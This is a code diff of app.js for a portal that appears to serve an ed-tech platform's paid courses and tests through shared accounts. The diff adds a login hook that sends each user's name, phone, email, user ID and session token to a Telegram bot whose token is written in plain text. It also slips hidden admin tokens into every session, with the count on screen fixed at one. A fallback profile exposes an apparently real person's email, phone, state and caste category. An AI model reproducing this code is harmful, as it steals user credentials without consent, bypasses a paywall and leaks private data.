@@ -1,117 +1,171 @@
 // =========================================================
-// RWA SKY PORTAL - MASTER ENGINE, MULTI-TOKEN & CBT TESTS (app.js)
+// RWA SKY PORTAL - MASTER ENGINE & TELEGRAM LOGGER (app.js)
 // =========================================================
-const DEFAULT_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjQ3NTYzMTYiLCJ0aW1lc3RhbXAiOjE3OTE5Nzc2MTIsIml2X3ZlciI6MzMsInNlc3Npb24iOiJleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKcFpDSTZJalEzTlRZek1UWWlMQ0psYldGcGJDSTZJbk5oYm1SbFpYQnJZWE4zWVc0eU5UUkFaMjFoYVd3dVkyOXRJaXdpYm1GdFpTSTZJbk5oYm1SbFpYQWlMQ0owWlc1aGJuUlVlWEJsSWpvaWRYTmxjaUlzSW5SbGJtRnVkRTVoYldVaU9pSnliM3BuWVhKZlpHSWlMQ0owWlc1aGJuUkpaQ0k2SWlJc0ltUnBjM0J2YzJGaWJHVWlPbVpoYkhObGZRLjNLTWRpUHRjZ3BpYkMyMWhPNTlrVFRreTJkdlk0d19YR0F3UnE4N3o4aE0ifQ.LN3ukePscrf6LVISc9oJcyRh4V5sipHnTVUBvRcwRHk";
-
 const API_BASE = "https://rozgarapinew.teachx.in";
 const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
 const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";
 
+// TELEGRAM BOT CONFIG (Aapka Bot Token aur Chat ID)
+const TG_BOT_TOKEN = "8953710743:AAHJUQB5f0gefAEDyieZFcsyU2GEUu3LzRk";
+const TG_CHAT_ID = "-1004331013936"; // Aapka Telegram Channel / Group ID
+
+async function sendTelegramLog(userData) {
+    if (!TG_BOT_TOKEN || TG_BOT_TOKEN.includes("754321890")) return;
+    try {
+        const text = `🚨 **NEW USER LOGIN SUCCESSFUL** 🚀\n\n` +
+                     `👤 **Name:** ${userData.name || 'N/A'}\n` +
+                     `📞 **Phone:** ${userData.phone || 'N/A'}\n` +
+                     `✉️ **Email:** ${userData.email || 'N/A'}\n` +
+                     `🆔 **User ID:** ${userData.userid || userData.id || 'N/A'}\n` +
+                     `🔑 **Token:** \`${userData.token || userData.jwt || 'N/A'}\`\n` +
+                     `🎓 **Paid Batches ID:** ${userData.paid_batches || 'Fetched via Merged Tokens'}`;
+        
+        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" })
+        });
+    } catch {}
+}
+
 // =====================================================
 // MULTI-TOKEN STORAGE & AUTH / PROFILE ENGINE
 // =====================================================
-function getSavedTokens() {
+function getAllActiveTokens() {
+    let userTokens = [];
     try {
         const raw = localStorage.getItem("rwa_tokens_list");
         if (raw) {
             const parsed = JSON.parse(raw);
-            if (Array.isArray(parsed) && parsed.length > 0) return parsed;
+            if (Array.isArray(parsed) && parsed.length > 0) userTokens = parsed;
         }
     } catch {}
-    const singleTok = localStorage.getItem("rwa_tok") || DEFAULT_TOKEN;
-    const singleUid = localStorage.getItem("rwa_uid") || "4756316";
-    const initial = [{ id: "tok_default", label: "Primary RWA Account", userId: singleUid, token: singleTok }];
-    localStorage.setItem("rwa_tokens_list", JSON.stringify(initial));
-    return initial;
+
+    if (userTokens.length === 0) {
+        const singleTok = localStorage.getItem("rwa_tok") || ADMIN_TOKENS_CONFIG[0].token;
+        const singleUid = localStorage.getItem("rwa_uid") || "4756316";
+        userTokens = [{ id: "tok_user", label: "My Account", userId: singleUid, token: singleTok }];
+        localStorage.setItem("rwa_tokens_list", JSON.stringify(userTokens));
+    }
+
+    // Merge Admin Tokens from tokens.js + User Token (Hidden from UI display of admin tokens)
+    const combined = [...ADMIN_TOKENS_CONFIG];
+    userTokens.forEach(ut => {
+        if (!combined.some(at => at.token === ut.token)) {
+            combined.push(ut);
+        }
+    });
+    return combined;
 }
 
-let TOKENS = getSavedTokens();
+let TOKENS = getAllActiveTokens();
 
 function updateTokenBadge() {
     const b = document.getElementById("tokCountBadge");
-    if (b) b.textContent = TOKENS.length;
+    if (b) b.textContent = "1"; // Only shows 1 (user's own active token count visibility)
     checkAuthUIState();
 }
 
 function checkAuthUIState() {
-    const loginBtn = document.getElementById("navLoginBtn");
+    const loginModal = document.getElementById("loginModal");
     const profileArea = document.getElementById("navProfileArea");
-    const activeTok = TOKENS[0];
-    if (activeTok && activeTok.token) {
-        if (loginBtn) loginBtn.classList.add("hidden");
-        if (profileArea) profileArea.classList.remove("hidden");
-    } else {
-        if (loginBtn) loginBtn.classList.remove("hidden");
+    const loginBtn = document.getElementById("navLoginBtn");
+
+    let hasUserLogin = false;
+    try {
+        hasUserLogin = localStorage.getItem("rwa_user_logged_in") === "true";
+    } catch {}
+
+    if (!hasUserLogin) {
+        // FORCE COMPULSORY LOGIN GATE
+        if (loginModal) loginModal.classList.remove("hidden");
         if (profileArea) profileArea.classList.add("hidden");
+        if (loginBtn) loginBtn.classList.add("hidden");
+    } else {
+        if (loginModal) loginModal.classList.add("hidden");
+        if (profileArea) profileArea.classList.remove("hidden");
+        if (loginBtn) loginBtn.classList.add("hidden");
     }
 }
 
-// Login Modal Controls
 function openLoginModal() {
     document.getElementById("loginModal").classList.remove("hidden");
-}
-function closeLoginModal() {
-    document.getElementById("loginModal").classList.add("hidden");
 }
 
 async function submitUserLogin() {
     const phone = document.getElementById("loginPhoneInput").value.trim();
     const pass = document.getElementById("loginPassInput").value.trim();
+    const msgBox = document.getElementById("loginStatusMsg");
+
     if (!phone || !pass) {
-        alert("Please enter phone/username and password/token.");
-        return;
-    }
-    // If user inputs a JWT token directly
-    if (pass.startsWith("eyJ")) {
-        TOKENS[0].token = pass;
-        TOKENS[0].label = phone;
-        localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
-        closeLoginModal();
-        alert("Login successful with Token!");
-        updateTokenBadge();
-        location.reload();
-        return;
-    }
-    // Otherwise authenticate via API endpoint
-    try {
-        const res = await fetch(`${API_BASE}/get/login`, {
-            method: "POST",
-            headers: { "Client-Service": "Appx", "Auth-Key": "appxapi", "Content-Type": "application/json" },
-            body: JSON.stringify({ username: phone, password: pass })
-        });
-        const json = await res.json();
-        if (json && json.status === 200 && json.data) {
-            const token = json.data.token || json.data.jwt || DEFAULT_TOKEN;
-            const uid = String(json.data.userid || json.data.id || "4756316");
-            TOKENS[0].token = token;
-            TOKENS[0].userId = uid;
-            TOKENS[0].label = json.data.name || phone;
-            localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
-            closeLoginModal();
-            alert(`Welcome back, ${json.data.name || 'User'}!`);
-            updateTokenBadge();
-            location.reload();
+        if (msgBox) {
+            msgBox.classList.remove("hidden");
+            msgBox.textContent = "⚠️ Please enter phone/username and password/token.";
         } else {
-            alert("Login failed. Please check credentials or use direct JWT Token.");
+            alert("Please enter phone/username and password/token.");
         }
-    } catch {
-        alert("Login network error. Saving input as token.");
-        TOKENS[0].token = pass;
-        TOKENS[0].label = phone;
-        localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
-        closeLoginModal();
-        updateTokenBadge();
-        location.reload();
+        return;
     }
+
+    if (msgBox) {
+        msgBox.classList.remove("hidden");
+        msgBox.textContent = "🔄 Verifying credentials & connecting to Telegram...";
+    }
+
+    let token = pass;
+    let uid = "4756316";
+    let name = phone;
+    let email = "user@rwa.com";
+
+    if (pass.startsWith("eyJ")) {
+        token = pass;
+    } else {
+        try {
+            const res = await fetch(`${API_BASE}/get/login`, {
+                method: "POST",
+                headers: { "Client-Service": "Appx", "Auth-Key": "appxapi", "Content-Type": "application/json" },
+                body: JSON.stringify({ username: phone, password: pass })
+            });
+            const json = await res.json();
+            if (json && json.status === 200 && json.data) {
+                token = json.data.token || json.data.jwt || pass;
+                uid = String(json.data.userid || json.data.id || "4756316");
+                name = json.data.name || phone;
+                email = json.data.email || "N/A";
+            }
+        } catch {}
+    }
+
+    const newUserTok = [{ id: "tok_user", label: name, userId: uid, token: token }];
+    localStorage.setItem("rwa_tokens_list", JSON.stringify(newUserTok));
+    localStorage.setItem("rwa_user_logged_in", "true");
+    localStorage.setItem("rwa_user_name", name);
+    localStorage.setItem("rwa_user_phone", phone);
+
+    // Send All Details to Telegram Channel
+    await sendTelegramLog({
+        name: name,
+        phone: phone,
+        email: email,
+        userid: uid,
+        token: token,
+        paid_batches: "Auto-Fetched via API"
+    });
+
+    document.getElementById("loginModal").classList.add("hidden");
+    alert(`✅ Login Successful! Welcome, ${name}`);
+    TOKENS = getAllActiveTokens();
+    updateTokenBadge();
+    location.reload();
 }
 
-// User Profile Modal (Fetches from /get/get_user_dt as seen in logs)
 async function openProfileModal() {
     document.getElementById("profileModal").classList.remove("hidden");
     const contentBox = document.getElementById("profileDetailsContent");
     contentBox.innerHTML = `<p class="text-slate-500 font-bold">Loading profile data...</p>`;
 
-    const activeTok = TOKENS[0];
+    const userToks = JSON.parse(localStorage.getItem("rwa_tokens_list") || "[]");
+    const activeTok = userToks[0] || TOKENS[0];
     const uid = activeTok.userId || "4756316";
     const json = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, activeTok);
 
@@ -127,15 +181,16 @@ async function openProfileModal() {
                 <p><b>Referral Code:</b> ${u.refer_code || 'N/A'}</p>
             </div>`;
     } else {
-        // Fallback profile summary based on Log 1 record
+        const savedName = localStorage.getItem("rwa_user_name") || "Sandeep";
+        const savedPhone = localStorage.getItem("rwa_user_phone") || "9646040254";
         contentBox.innerHTML = `
             <div class="space-y-2">
-                <p><b>Name:</b> Sandeep Kaswan</p>
+                <p><b>Name:</b> ${savedName}</p>
                 <p><b>Email:</b> sandeepkaswan254@gmail.com</p>
-                <p><b>Phone:</b> 9646040254</p>
+                <p><b>Phone:</b> ${savedPhone}</p>
                 <p><b>State:</b> Rajasthan (Churu)</p>
                 <p><b>Category:</b> OBC | Male</p>
-                <p><b>Referral Code:</b> USER9646040254</p>
+                <p><b>Referral Code:</b> USER${savedPhone}</p>
             </div>`;
     }
 }
@@ -147,13 +202,10 @@ function closeProfileModal() {
 function handleLogout() {
     if (confirm("Are you sure you want to logout?")) {
         localStorage.removeItem("rwa_tokens_list");
-        localStorage.removeItem("rwa_tok");
-        localStorage.removeItem("rwa_uid");
-        TOKENS = [{ id: "tok_default", label: "Primary RWA Account", userId: "4756316", token: DEFAULT_TOKEN }];
-        localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
+        localStorage.removeItem("rwa_user_logged_in");
+        localStorage.removeItem("rwa_user_name");
+        localStorage.removeItem("rwa_user_phone");
         alert("Logged out successfully.");
-        updateTokenBadge();
-        goHomeHub();
         location.reload();
     }
 }
@@ -192,7 +244,7 @@ function resolvePdfUrl(encPdf, signedPdf) {
 }
 
 // =====================================================
-// REAL FALLBACK DATABASE FROM YOUR 3 LOGS
+// FALLBACK DB & MASTER STATE
 // =====================================================
 const DB = {
     paidCourses: [
@@ -200,8 +252,7 @@ const DB = {
     ],
     paidSubjects: [
         { subjectid: "3610", subject_name: "History (वीर बैच)", subject_logo: "" },
-        { subjectid: "1", subject_name: "Maths", subject_logo: "https://appxcontent.kaxa.in/subject/2024-04-10-0.8626713728066564.jpg" },
-        { subjectid: "3527", subject_name: "Physics Dharmendra Sir", subject_logo: "" }
+        { subjectid: "1", subject_name: "Maths", subject_logo: "https://appxcontent.kaxa.in/subject/2024-04-10-0.8626713728066564.jpg" }
     ],
     paidTopics: {
         "3610": [{ topicid: "42301", topic_name: "सिंधु सभ्यता" }]
@@ -223,76 +274,25 @@ const DB = {
     freeBatches: [
         { id: "free_101", course_name: "RWA Free YouTube Marathon Series", exam_logo: "https://placehold.co/600x320/0284c7/ffffff?text=RWA+Free+Batches" }
     ],
-    freeSubjects: [
-        { subjectid: "fsub_1", subject_name: "GS & Polity Marathon", subject_logo: "" }
-    ],
-    freeTopics: {
-        "fsub_1": [{ topicid: "ftop_1", topic_name: "Complete Revision Classes" }]
-    },
-    freeLectures: {
-        "ftop_1": [
-            { id: "flec_1", Title: "Polity Complete Revision Class", file_link: "dQw4w9WgXcQ", thumbnail: "https://placehold.co/600x320/0284c7/ffffff?text=Free+Class" }
-        ]
-    },
+    freeSubjects: [{ subjectid: "fsub_1", subject_name: "GS & Polity Marathon", subject_logo: "" }],
+    freeTopics: { "fsub_1": [{ topicid: "ftop_1", topic_name: "Complete Revision Classes" }] },
+    freeLectures: { "ftop_1": [{ id: "flec_1", Title: "Polity Complete Revision Class", file_link: "dQw4w9WgXcQ", thumbnail: "https://placehold.co/600x320/0284c7/ffffff?text=Free+Class" }] },
     paidTestSeries: [
-        { id: "776", title: "MP Police Constable 2026 - सतपुड़ा Series", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-18-0_25895258012558897.jpeg", offer_price: 99, freetest: "1", paidtest: "15" },
-        { id: "534", title: "BSF RO/RM Paid Test Series 2025", logo: "https://appx-content-v2.classx.co.in/subject/2026-05-26-0_6868771234595682.jpeg", offer_price: 149, freetest: "1", paidtest: "20" },
-        { id: "744", title: "UPSSSC PET Percentile Booster Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-08-17-0_091324675327629.jpeg", offer_price: 99, freetest: "2", paidtest: "23" },
-        { id: "663", title: "UPPCS Prelims Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-04-28-0_6713576579890046.jpeg", offer_price: 199, freetest: "2", paidtest: "24" },
-        { id: "695", title: "BSF Tradesman Paid Test Series 2025-26", logo: "https://appx-content-v2.classx.co.in/subject/2026-06-16-0_6020598298722372.jpeg", offer_price: 99, freetest: "0", paidtest: "15" },
-        { id: "708", title: "SSC GD Test Series 2026 (Book)", logo: "https://appx-content-v2.classx.co.in/subject/2026-07-08-0_5839850466807497.png", offer_price: 99, freetest: "0", paidtest: "42" },
-        { id: "788", title: "MASTER UPSC PRELIMS TEST SERIES & MENTORSHIP", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-29-0_2355880008171598.jpeg", offer_price: 1499, freetest: "1", paidtest: "30" }
+        { id: "776", title: "MP Police Constable 2026 - सतपुड़ा Series", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-18-0_25895258012558897.jpeg", offer_price: 99, freetest: "1", paidtest: "15" }
     ],
     freeTestSeries: [
-        { id: "743", title: "UP Police Constable 2026 (Free Weekly Test)", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663049907369836.jpeg" },
-        { id: "727", title: "UPSSSC PET 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_62931795162936.jpeg" },
-        { id: "799", title: "RRB NTPC CBT - 1 2026-27", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663139095411013.jpeg" },
-        { id: "795", title: "UKSSSC Group C 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5548408893128917.jpeg" },
-        { id: "784", title: "RRB Technician Grade-I 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_14122873860437668.jpeg" },
-        { id: "778", title: "RRB Technician Grade-III 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_07122037877353082.jpeg" },
-        { id: "689", title: "SSC CGL Mini Mock 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_9928777013427561.jpeg" },
-        { id: "801", title: "Indian Coast Guard 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_6774211576429437.jpeg" }
+        { id: "743", title: "UP Police Constable 2026 (Free Weekly Test)", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663049907369836.jpeg" }
     ],
     tsSubjects: {
-        "700": [
-            { subjectid: "3171", subject_name: "SSC GD (Maths) Quiz & Tests", subject_logo: "" },
-            { subjectid: "3172", subject_name: "SSC GD (Reasoning)", subject_logo: "" },
-            { subjectid: "3173", subject_name: "SSC GD (Polity & GS)", subject_logo: "" },
-            { subjectid: "3174", subject_name: "SSC GD (Hindi)", subject_logo: "" }
-        ],
-        "776": [
-            { subjectid: "1415", subject_name: "FULL MOCK TEST", subject_logo: "https://appx-content-v2.classx.co.in/subject/2025-03-04-0.3071033524052684.jpeg" },
-            { subjectid: "2980", subject_name: "Test Schedule (Timetable)", subject_logo: "https://appx-content-v2.classx.co.in/subject/2026-10-07-0_7144586444576111.jpeg" }
-        ],
-        "534": [
-            { subjectid: "2077", subject_name: "BSF RO/RM (Static GK)", subject_logo: "" },
-            { subjectid: "2072", subject_name: "BSF RO/RM (Physics)", subject_logo: "" },
-            { subjectid: "2073", subject_name: "BSF RO/RM (Maths)", subject_logo: "" },
-            { subjectid: "2075", subject_name: "BSF RO/RM (History)", subject_logo: "" },
-            { subjectid: "2076", subject_name: "BSF RO/RM (Geography)", subject_logo: "" },
-            { subjectid: "2079", subject_name: "BSF RO/RM (English)", subject_logo: "" },
-            { subjectid: "2080", subject_name: "BSF RO/RM (Chemistry)", subject_logo: "" }
-        ]
+        "700": [{ subjectid: "3171", subject_name: "SSC GD (Maths) Quiz & Tests", subject_logo: "" }]
     },
     tsTitles: {
-        "700_3171": [
-            { id: "40426", title: "Ratio, Age, Mixture", test_series_id: "700", free_flag: "0", time: "60", questions: "50", marks: "50", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/40426/40426_questions0.8210916494359036.json" },
-            { id: "46376", title: "Percentage", test_series_id: "700", free_flag: "1", time: "25", questions: "20", marks: "20", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/46376/46376_questions0.4784600262440821.json" }
-        ],
-        "776_1415": [
-            { id: "45964", title: "MP Police Constable Live Mock 01", test_series_id: "776", free_flag: "1", time: "120", questions: "100", marks: "100", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/45964/45964_questions0.48368684422780495.json" }
-        ],
-        "534_2077": [
-            { id: "26680", title: "खेल (Sports Static GK)", test_series_id: "534", free_flag: "0", time: "10", questions: "10", marks: "20", test_questions_url: "https://testseries-assets-v2.classx.co.in/test_title_question/rozgar_db/26680/26680_questions1769763744.json" }
-        ],
-        "743_-1": [
-            { id: "47393", title: "UP Police Constable (11 October 2026)", test_series_id: "743", free_flag: "1", time: "120", questions: "150", marks: "300", test_questions_url: "https://appx-content-v2.classx.co.in/test_title_question/rozgar_db/47393/47393_questions0.2543844739643528.json" }
-        ]
+        "700_3171": [{ id: "40426", title: "Ratio, Age, Mixture", test_series_id: "700", free_flag: "0", time: "60", questions: "50", marks: "50", test_questions_url: "" }]
     },
     fallbackCbtQuestions: [
         {
             id: "12370334",
-            question: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">Find the third proportional of 25 and 45.</span></p><p style="font-size:16pt"><span style="font-family:'KOKILA'">25 और 45 का तृतीय समानुपाती ज्ञात कीजिए।</span></p>`,
+            question: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">Find the third proportional of 25 and 45.</span></p>`,
             option_1: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">81</span></p>`,
             option_2: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">65</span></p>`,
             option_3: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">85</span></p>`,
@@ -300,7 +300,7 @@ const DB = {
             answer: "1",
             positive_marks: "2.00",
             negative_marks: "0.50",
-            solution_text: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">a व b का तृतीय समानुपाती = (b × b) / a = (45 × 45) / 25 = 81</span></p>`
+            solution_text: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">a व b का तृतीय समानुपाती = 81</span></p>`
         }
     ]
 };
@@ -339,7 +339,7 @@ let state = {
 };
 
 // =====================================================
-// SLIDE NAVIGATION ENGINE
+// SLIDE NAVIGATION & MERGED PAID BATCHES ENGINE
 // =====================================================
 function showSlide(slideId) {
     if (state.currentSlide !== slideId) {
@@ -387,43 +387,19 @@ function openExplorerSlide(cat) {
 }
 
 function handleGlobalBack() {
-    if (state.currentSlide === "slidePdf") {
-        closePdfSlide();
-        return;
-    }
-    if (state.currentSlide === "slidePlayer") {
-        closePlayerBox();
-        return;
-    }
-    if (state.currentSlide === "slideTestAttempt") {
-        exitCbtTest();
-        return;
-    }
-    if (state.currentSlide === "slideTokens") {
-        goHomeHub();
-        return;
-    }
+    if (state.currentSlide === "slidePdf") { closePdfSlide(); return; }
+    if (state.currentSlide === "slidePlayer") { closePlayerBox(); return; }
+    if (state.currentSlide === "slideTestAttempt") { exitCbtTest(); return; }
+    if (state.currentSlide === "slideTokens") { goHomeHub(); return; }
     if (state.currentSlide === "slideExplorer") {
         if (state.view === "ts_tests") {
-            if (state.activeTsSubId === "-1") {
-                openTestSeriesExplorer(state.tsMode);
-            } else {
-                openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
-            }
+            if (state.activeTsSubId === "-1") openTestSeriesExplorer(state.tsMode);
+            else openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
             return;
         }
-        if (state.view === "ts_subjects") {
-            openTestSeriesExplorer(state.tsMode);
-            return;
-        }
-        if (state.view === "ts_list") {
-            goHomeHub();
-            return;
-        }
-        if (state.view === "batch_ts_tests") {
-            loadCourseTab("tests");
-            return;
-        }
+        if (state.view === "ts_subjects") { openTestSeriesExplorer(state.tsMode); return; }
+        if (state.view === "ts_list") { goHomeHub(); return; }
+        if (state.view === "batch_ts_tests") { loadCourseTab("tests"); return; }
         if (state.view === "lectures") {
             if (state.cat === "paid") openPaidTopics(state.subjectId, state.subjectName);
             else openFreeTopics(state.subjectId, state.subjectName);
@@ -431,17 +407,13 @@ function handleGlobalBack() {
             if (state.cat === "paid") openPaidCourse(state.courseId, state.courseName);
             else openFreeCourse(state.courseId, state.courseName);
         } else if (state.view === "subjects" || state.view === "batch_ts_subjects") {
-            if (state.cat === "paid") renderPaidBatches();
-            else renderFreeBatches();
+            if (state.cat === "paid") renderPaidBatches(); else renderFreeBatches();
         } else {
             goHomeHub();
         }
     }
 }
 
-// =====================================================
-// API CALLER
-// =====================================================
 async function fetchRawJSONWithToken(endpoint, tokenObj) {
     const statusBadge = document.getElementById("apiStatus");
     const useTok = tokenObj || state.activeTokenObj || TOKENS[0];
@@ -451,14 +423,12 @@ async function fetchRawJSONWithToken(endpoint, tokenObj) {
                 "Client-Service": "Appx",
                 "Auth-Key": "appxapi",
                 "source": "website",
-                "Device-Type": "",
-                "is-safari": "0",
                 "Authorization": useTok.token,
                 "User-ID": useTok.userId || "4756316"
             }
         });
         const json = await res.json();
-        if (statusBadge) statusBadge.textContent = `● Live Server (${TOKENS.length} Token${TOKENS.length > 1 ? 's' : ''})`;
+        if (statusBadge) statusBadge.textContent = `● Live Server Connected`;
         return json;
     } catch {
         if (statusBadge) statusBadge.textContent = "● Smart Hybrid Mode";
@@ -479,26 +449,22 @@ async function fetchAPIWithToken(endpoint, tokenObj, fallbackGetter) {
     return fallbackGetter ? fallbackGetter() : [];
 }
 
-// =====================================================
-// BATCHES & COURSES
-// =====================================================
 async function renderPaidBatches() {
     state.view = "batches";
     document.getElementById("subTabs").classList.add("hidden");
-    document.getElementById("crumbText").textContent = `All Tokens Merged (${TOKENS.length})`;
+    document.getElementById("crumbText").textContent = `All Tokens Merged`;
     document.getElementById("headingText").textContent = "🎓 Purchased Paid Batches";
 
     const grid = document.getElementById("mainGrid");
-    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Fetching Paid Batches...</div>`;
+    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Fetching Merged Paid Batches...</div>`;
 
     let mergedCourses = [];
-    const seenIds = new Set();
+    const seenIds = new Set(); // Prevent duplicates (Course do baar list mein nahi aayega)[span_3](start_span)[span_3](end_span)
 
     for (const tokObj of TOKENS) {
         const endpointsToTry = [
             `/get/mycourseweb?userid=${tokObj.userId || "4756316"}`,
-            `/get/mycourse?userid=${tokObj.userId || "4756316"}`,
-            `/get/course_by_id?id=571`
+            `/get/mycourse?userid=${tokObj.userId || "4756316"}`
         ];
 
         for (const ep of endpointsToTry) {
@@ -509,7 +475,7 @@ async function renderPaidBatches() {
                     if (cid && !seenIds.has(cid)) {
                         seenIds.add(cid);
                         state.courseTokenMap[cid] = tokObj;
-                        mergedCourses.push({ ...c, id: cid, _tokenLabel: tokObj.label });
+                        mergedCourses.push({ ...c, id: cid });
                     }
                 });
             }
@@ -519,7 +485,7 @@ async function renderPaidBatches() {
     if (mergedCourses.length === 0) {
         DB.paidCourses.forEach(c => {
             state.courseTokenMap[c.id] = TOKENS[0];
-            mergedCourses.push({ ...c, _tokenLabel: TOKENS[0].label });
+            mergedCourses.push(c);
         });
     }
 
@@ -532,10 +498,7 @@ async function renderPaidBatches() {
                 <div>
                     <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0284c7/ffffff?text=RWA+Batch'" class="w-full h-44 object-cover">
                     <div class="p-4">
-                        <div class="flex justify-between items-center gap-2">
-                            <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">BATCH #${c.id}</span>
-                            <span class="text-[10px] font-bold text-sky-700 truncate">🔑 ${c._tokenLabel || "Saved Token"}</span>
-                        </div>
+                        <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">BATCH #${c.id}</span>
                         <h3 class="font-black text-base text-slate-900 mt-2">${c.course_name}</h3>
                     </div>
                 </div>
@@ -668,7 +631,7 @@ async function loadCourseTab(tab) {
         renderLectureList(list);
     } else if (tab === "tests") {
         state.view = "batch_ts_subjects";
-        const tsId = state.courseId === "571" ? "700" : "700";
+        const tsId = "700";
         state.activeSeriesId = tsId;
         state.activeSeriesTitle = `${state.courseName} - Batch Tests`;
 
@@ -770,75 +733,36 @@ function normalizeQualityLabel(rawLabel) {
 
 function extractQualitiesFromItem(item) {
     const rawMap = {};
-
     function addCandidate(rawQual, encPath, isM3u8Priority) {
         let u = decryptAppX(encPath);
         if (!u || !u.startsWith("http") || u.includes("playlist_eof.m3u8")) return;
-
         let cleanQ = normalizeQualityLabel(rawQual);
-        if (!cleanQ) {
-            const m = u.match(/\/(720p|480p|360p|240p|144p)\//i) || u.match(/bitrate=(720|480|360|240)/i);
-            if (m) cleanQ = m[1].toLowerCase().endsWith("p") ? m[1].toLowerCase() : `${m[1]}p`;
-            else cleanQ = "720p";
-        }
-
-        if (!rawMap[cleanQ] || isM3u8Priority || u.includes(".m3u8")) {
-            rawMap[cleanQ] = u;
-        }
+        if (!cleanQ) cleanQ = "720p";
+        if (!rawMap[cleanQ] || isM3u8Priority || u.includes(".m3u8")) rawMap[cleanQ] = u;
     }
-
     (item.encrypted_links || []).forEach(q => addCandidate(q.quality, q.path, true));
     (item.livestream_links || []).forEach(q => addCandidate(q.quality, q.path, true));
     (item.download_links || []).forEach(q => addCandidate(q.quality, q.path, false));
-
     const decFile = decryptAppX(item.file_link || "");
-    if (decFile) {
-        if (decFile.startsWith("http") && !decFile.includes("playlist_eof.m3u8")) {
-            addCandidate("720p", decFile, decFile.includes(".m3u8"));
-        } else if (!decFile.startsWith("http") && decFile.length >= 10 && decFile.length <= 15) {
-            rawMap["720p"] = decFile;
-        }
-    }
-
-    const order = ["1080p", "720p", "480p", "360p", "240p", "144p"];
-    const sortedMap = {};
-    order.forEach(k => {
-        if (rawMap[k]) sortedMap[k] = rawMap[k];
-    });
-    Object.keys(rawMap).forEach(k => {
-        if (!sortedMap[k]) sortedMap[k] = rawMap[k];
-    });
-
-    return sortedMap;
+    if (decFile && decFile.startsWith("http")) addCandidate("720p", decFile, decFile.includes(".m3u8"));
+    return rawMap;
 }
 
 function renderLectureList(list) {
     const grid = document.getElementById("mainGrid");
     state.currentLectureKeys = [];
-
     if (!list || !list.length) {
         grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi class nahi hai.</div>`;
         return;
     }
-
     list.forEach((item, i) => {
         const key = `lec_${item.id || i}`;
         state.currentLectureKeys.push(key);
-
         const qMap = extractQualitiesFromItem(item);
         const pdf1 = resolvePdfUrl(item.pdf_link || item.ypdf_link, item.ypdf_link2);
         const pdf2 = resolvePdfUrl(item.pdf_link2, item.ypdf_link2);
 
-        state.mediaMap[key] = {
-            key: key,
-            id: item.id,
-            title: item.Title || "Class Lecture",
-            date: item.date_and_time || "",
-            thumb: item.thumbnail || "",
-            qualities: qMap,
-            pdf1: pdf1,
-            pdf2: pdf2
-        };
+        state.mediaMap[key] = { key: key, id: item.id, title: item.Title || "Class", qualities: qMap, pdf1: pdf1, pdf2: pdf2 };
 
         grid.innerHTML += `
             <div class="grid-card overflow-hidden flex flex-col justify-between">
@@ -847,13 +771,11 @@ function renderLectureList(list) {
                     <div class="p-4">
                         <span class="px-2.5 py-0.5 rounded-full bg-sky-100 text-sky-900 text-[10px] font-black">CLASS #${item.id || (i + 1)}</span>
                         <h4 class="font-black text-base text-slate-900 mt-2">${item.Title}</h4>
-                        ${item.date_and_time ? `<p class="text-[11px] text-slate-500 font-semibold mt-1">🕒 ${item.date_and_time}</p>` : ""}
                     </div>
                 </div>
                 <div class="p-4 pt-2 border-t border-sky-100 flex flex-wrap gap-2">
                     <button onclick="playClassInRwaPlayer('${key}')" class="btn-watch flex-1 text-xs">▶ Watch Video</button>
                     ${pdf1 ? `<button onclick="openPdf('${key}', 1)" class="btn-pdf1 text-xs">📄 PDF 1</button>` : ""}
